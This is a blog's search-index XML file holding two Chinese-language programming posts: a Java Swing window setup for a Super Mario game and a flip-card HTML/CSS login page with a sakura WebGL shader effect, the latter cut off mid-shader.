<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java 创建窗口</title>
      <link href="/2021/11/05/CodeGame_Java_SuperMary_Test01/"/>
      <url>/2021/11/05/CodeGame_Java_SuperMary_Test01/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-窗口绘制"><a href="#Java-窗口绘制" class="headerlink" title="Java 窗口绘制"></a>Java 窗口绘制</h2><blockquote><p>创建窗口我们需要继承 JFrame 类</p><p>向窗口对象添加键盘监听器 需要该类实现 KeyListener 接口 并重写抽象方法</p></blockquote><h3 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.arvin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.KeyEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.KeyListener;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  窗口框架类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowsFrame</span>  <span class="keyword">extends</span> <span class="title">JFrame</span> <span class="keyword">implements</span> <span class="title">KeyListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 空参构造</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WindowsFrame</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置窗口的大小为 800 * 600</span></span><br><span class="line">        <span class="keyword">this</span>.setSize(<span class="number">800</span>, <span class="number">600</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置窗口居中显示</span></span><br><span class="line">        <span class="keyword">this</span>.setLocationRelativeTo(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置窗口的可见性</span></span><br><span class="line">        <span class="keyword">this</span>.setVisible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建点击窗口上的关闭键，结束程序</span></span><br><span class="line">        <span class="keyword">this</span>.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置窗口大小不可变</span></span><br><span class="line">        <span class="keyword">this</span>.setResizable(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向窗口对象添加键盘监听器 需要该类实现 KeyListener 接口 并重写抽象方法</span></span><br><span class="line">        <span class="keyword">this</span>.addKeyListener(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置窗口名称</span></span><br><span class="line">        <span class="keyword">this</span>.setTitle(<span class="string">&quot;超级玛丽&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  Main 主函数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 WindowsFrame 的对象</span></span><br><span class="line">        WindowsFrame windowsFrame = <span class="keyword">new</span> WindowsFrame();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  KeyListener并重写抽象方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyTyped</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyPressed</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyReleased</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CodeGame </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Login Page 设计演示01</title>
      <link href="/2021/11/01/design_LoginPage_2021_11_01/"/>
      <url>/2021/11/01/design_LoginPage_2021_11_01/</url>
      
        <content type="html"><![CDATA[<p><strong>分享大家一个好看的 Login Page 代码</strong></p><hr><h3 id="演示图"><a href="#演示图" class="headerlink" title="演示图"></a>演示图</h3><p><img src="https://z3.ax1x.com/2021/11/01/IpzNu9.jpg"><br><img src="https://z3.ax1x.com/2021/11/01/IpzUBR.jpg"></p><h3 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    Developer: @Arvin</span></span><br><span class="line"><span class="comment">    Explain: Login Page</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="number">#A7CFFF</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">H1</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="number">38px</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">H1</span>,<span class="selector-tag">H2</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>: <span class="number">#1F2029</span>;</span></span><br><span class="line"><span class="css">            user-select: none;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.switch</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="number">#FCFBFA</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">170px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-left</span>: -<span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>: <span class="number">73%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/* 选择同级后最近元素 @Arvin */</span></span></span><br><span class="line"><span class="css">        <span class="selector-id">#change</span><span class="selector-pseudo">:checked</span>+<span class="selector-tag">label</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-id">#change</span><span class="selector-pseudo">:not</span>(<span class="selector-pseudo">:checked</span>)+<span class="selector-tag">label</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="number">#ff5f99</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>: <span class="number">#FCFBFA</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">280px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">padding</span>: <span class="number">8px</span> <span class="number">0</span>; <span class="comment">/* Padding 方便文字垂直居中显示 @Arvin */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-size</span>: <span class="number">24px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-weight</span>: <span class="number">600</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-left</span>: -<span class="number">140px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>: <span class="number">82%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/* 页面旋转模块 */</span></span></span><br><span class="line"><span class="css">        <span class="selector-class">.turn</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">450px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>: <span class="number">8%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">perspective</span>: <span class="number">800px</span>; <span class="comment">/* 旋转时候的透视效果 @Arvin */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-left</span>: -<span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.over</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">transition</span>: all <span class="number">1.6s</span> ease; <span class="comment">/* 旋转的持续时间 ease 是慢快慢 @Arvin */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-id">#change</span><span class="selector-pseudo">:checked</span></span></span><br><span class="line"><span class="css">        ~</span></span><br><span class="line"><span class="css">        <span class="selector-class">.turn</span> <span class="selector-class">.over</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">transform</span>: <span class="built_in">rotateY</span>(<span class="number">180deg</span>);</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">form</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="number">#FCFBFA</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.sign</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">transform</span>: <span class="built_in">rotateY</span>(<span class="number">180deg</span>);</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">input</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="number">#4E495D</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">70%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">48px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">16px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-size</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-weight</span>: <span class="number">500</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>: <span class="number">#ff5f99</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">outline</span>: none;</span></span><br><span class="line"><span class="css">            <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">4px</span> <span class="number">8px</span> <span class="built_in">rgba</span>(<span class="number">78</span>, <span class="number">73</span>, <span class="number">79</span>, .<span class="number">5</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;</span></span><br><span class="line"><span class="css">            <span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1px</span>);</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/* 选择 Class 为 Login 的子元素中的前三个 input @Arvin */</span></span></span><br><span class="line"><span class="css">        <span class="selector-class">.login</span> <span class="selector-tag">input</span><span class="selector-pseudo">:nth-child</span>(-n+<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.btn</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="number">#981E61</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">280px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-weight</span>: <span class="number">600</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>: <span class="number">#FCFBFA</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-size</span>: <span class="number">24px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">padding</span>: <span class="number">6px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 旋转开关 @Arvin --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;switch&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">H2</span>&gt;</span>没有/已有账户？<span class="tag">&lt;/<span class="name">H2</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;change&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;change&quot;</span>&gt;</span>切 换<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;turn&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;over&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;login&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">H1</span>&gt;</span>欢迎回来（＾－＾）<span class="tag">&lt;/<span class="name">H1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;用户名&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;passwirld&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;密码&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登 录&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;sign&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">H1</span>&gt;</span>加入我们（＾－＾）<span class="tag">&lt;/<span class="name">H1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;用户名&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;邮箱&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;passwirld&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;密码&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;passwirld&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;确认密码&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 樱花效果 来源于网上开源代码 @Arvin --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- partial:index.partial.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;sakura&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- sakura shader --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;sakura_point_vsh&quot;</span> <span class="attr">type</span>=<span class="string">&quot;x-shader/x_vertex&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  uniform mat4 uProjection;</span></span><br><span class="line"><span class="javascript">  uniform mat4 uModelview;</span></span><br><span class="line"><span class="javascript">  uniform vec3 uResolution;</span></span><br><span class="line"><span class="javascript">  uniform vec3 uOffset;</span></span><br><span class="line"><span class="javascript">  uniform vec3 uDOF;  <span class="comment">//x:focus distance, y:focus radius, z:max radius</span></span></span><br><span class="line"><span class="javascript">  uniform vec3 uFade; <span class="comment">//x:start distance, y:half distance, z:near fade start</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  attribute vec3 aPosition;</span></span><br><span class="line"><span class="javascript">  attribute vec3 aEuler;</span></span><br><span class="line"><span class="javascript">  attribute vec2 aMisc; <span class="comment">//x:size, y:fade</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  varying vec3 pposition;</span></span><br><span class="line"><span class="javascript">  varying float psize;</span></span><br><span class="line"><span class="javascript">  varying float palpha;</span></span><br><span class="line"><span class="javascript">  varying float pdist;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="comment">//varying mat3 rotMat;</span></span></span><br><span class="line"><span class="javascript">  varying vec3 normX;</span></span><br><span class="line"><span class="javascript">  varying vec3 normY;</span></span><br><span class="line"><span class="javascript">  varying vec3 normZ;</span></span><br><span class="line"><span class="javascript">  varying vec3 normal;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  varying float diffuse;</span></span><br><span class="line"><span class="javascript">  varying float specular;</span></span><br><span class="line"><span class="javascript">  varying float rstop;</span></span><br><span class="line"><span class="javascript">  varying float distancefade;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">void</span> <span class="function"><span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// Projection is based on vertical angle</span></span></span><br><span class="line"><span class="javascript">      vec4 pos = uModelview * vec4(aPosition + uOffset, <span class="number">1.0</span>);</span></span><br><span class="line"><span class="javascript">      gl_Position = uProjection * pos;</span></span><br><span class="line"><span class="javascript">      gl_PointSize = aMisc.x * uProjection[<span class="number">1</span>][<span class="number">1</span>] / -pos.z * uResolution.y * <span class="number">0.5</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      pposition = pos.xyz;</span></span><br><span class="line"><span class="javascript">      psize = aMisc.x;</span></span><br><span class="line"><span class="javascript">      pdist = length(pos.xyz);</span></span><br><span class="line"><span class="javascript">      palpha = smoothstep(<span class="number">0.0</span>, <span class="number">1.0</span>, (pdist - <span class="number">0.1</span>) / uFade.z);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      vec3 elrsn = sin(aEuler);</span></span><br><span class="line"><span class="javascript">      vec3 elrcs = cos(aEuler);</span></span><br><span class="line"><span class="javascript">      mat3 rotx = mat3(</span></span><br><span class="line"><span class="javascript">          <span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>,</span></span><br><span class="line"><span class="javascript">          <span class="number">0.0</span>, elrcs.x, elrsn.x,</span></span><br><span class="line"><span class="javascript">          <span class="number">0.0</span>, -elrsn.x, elrcs.x</span></span><br><span class="line"><span class="javascript">      );</span></span><br><span class="line"><span class="javascript">      mat3 roty = mat3(</span></span><br><span class="line"><span class="javascript">          elrcs.y, <span class="number">0.0</span>, -elrsn.y,</span></span><br><span class="line"><span class="javascript">          <span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>,</span></span><br><span class="line"><span class="javascript">          elrsn.y, <span class="number">0.0</span>, elrcs.y</span></span><br><span class="line"><span class="javascript">      );</span></span><br><span class="line"><span class="javascript">      mat3 rotz = mat3(</span></span><br><span class="line"><span class="javascript">          elrcs.z, elrsn.z, <span class="number">0.0</span>,</span></span><br><span class="line"><span class="javascript">          -elrsn.z, elrcs.z, <span class="number">0.0</span>,</span></span><br><span class="line"><span class="javascript">          <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">1.0</span></span></span><br><span class="line"><span class="javascript">      );</span></span><br><span class="line"><span class="javascript">      mat3 rotmat = rotx * roty * rotz;</span></span><br><span class="line"><span class="javascript">      normal = rotmat[<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      mat3 trrotm = mat3(</span></span><br><span class="line"><span class="javascript">          rotmat[<span class="number">0</span>][<span class="number">0</span>], rotmat[<span class="number">1</span>][<span class="number">0</span>], rotmat[<span class="number">2</span>][<span class="number">0</span>],</span></span><br><span class="line"><span class="javascript">          rotmat[<span class="number">0</span>][<span class="number">1</span>], rotmat[<span class="number">1</span>][<span class="number">1</span>], rotmat[<span class="number">2</span>][<span class="number">1</span>],</span></span><br><span class="line"><span class="javascript">          rotmat[<span class="number">0</span>][<span class="number">2</span>], rotmat[<span class="number">1</span>][<span class="number">2</span>], rotmat[<span class="number">2</span>][<span class="number">2</span>]</span></span><br><span class="line"><span class="javascript">      );</span></span><br><span class="line"><span class="javascript">      normX = trrotm[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">      normY = trrotm[<span class="number">1</span>];</span></span><br><span class="line"><span class="javascript">      normZ = trrotm[<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> vec3 lit = vec3(<span class="number">0.6917144638660746</span>, <span class="number">0.6917144638660746</span>, -<span class="number">0.20751433915982237</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      float tmpdfs = dot(lit, normal);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span>(tmpdfs &lt; <span class="number">0.0</span>) &#123;</span></span><br><span class="line"><span class="javascript">          normal = -normal;</span></span><br><span class="line"><span class="javascript">          tmpdfs = dot(lit, normal);</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript">      diffuse = <span class="number">0.4</span> + tmpdfs;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      vec3 eyev = normalize(-pos.xyz);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span>(dot(eyev, normal) &gt; <span class="number">0.0</span>) &#123;</span></span><br><span class="line"><span class="javascript">          vec3 hv = normalize(eyev + lit);</span></span><br><span class="line"><span class="javascript">          specular = pow(max(dot(hv, normal), <span class="number">0.0</span>), <span class="number">20.0</span>);</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">          specular = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      rstop = clamp((abs(pdist - uDOF.x) - uDOF.y) / uDOF.z, <span class="number">0.0</span>, <span class="number">1.0</span>);</span></span><br><span class="line"><span class="javascript">      rstop = pow(rstop, <span class="number">0.5</span>);</span></span><br><span class="line"><span class="javascript">      <span class="comment">//-0.69315 = ln(0.5)</span></span></span><br><span class="line"><span class="javascript">      distancefade = min(<span class="number">1.0</span>, exp((uFade.x - pdist) * <span class="number">0.69315</span> / uFade.y));</span></span><br><span class="line"><span class="javascript">  &#125;</span></span><br><span class="line"><span class="javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;sakura_point_fsh&quot;</span> <span class="attr">type</span>=<span class="string">&quot;x-shader/x_fragment&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  #ifdef GL_ES</span></span><br><span class="line"><span class="javascript">  <span class="comment">//precision mediump float;</span></span></span><br><span class="line"><span class="javascript">  precision highp float;</span></span><br><span class="line"><span class="javascript">  #endif</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  uniform vec3 uDOF;  <span class="comment">//x:focus distance, y:focus radius, z:max radius</span></span></span><br><span class="line"><span class="javascript">  uniform vec3 uFade; <span class="comment">//x:start distance, y:half distance, z:near fade start</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> vec3 fadeCol = vec3(<span class="number">0.08</span>, <span class="number">0.03</span>, <span class="number">0.06</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  varying vec3 pposition;</span></span><br><span class="line"><span class="javascript">  varying float psize;</span></span><br><span class="line"><span 